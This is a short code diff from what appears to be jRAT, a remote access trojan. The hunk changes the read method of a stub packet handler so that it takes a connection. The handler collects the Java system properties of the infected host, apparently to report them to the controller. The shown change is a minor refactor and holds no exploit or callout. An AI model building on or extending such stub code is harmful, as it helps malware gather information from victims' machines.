@@ -9,7 +9,7 @@ import se.jrat.stub.packets.outgoing.Packet44SystemJavaProperty;
 public class Packet61SystemJavaProperties extends AbstractIncomingPacket {
 
 	@Override
-	public void read() throws Exception {
+	public void read(Connection con) throws Exception {
 		Set<Object> keys = System.getProperties().keySet();
 		for (Object obj : keys) {
 			if (obj.toString().toLowerCase().startsWith("java")) {
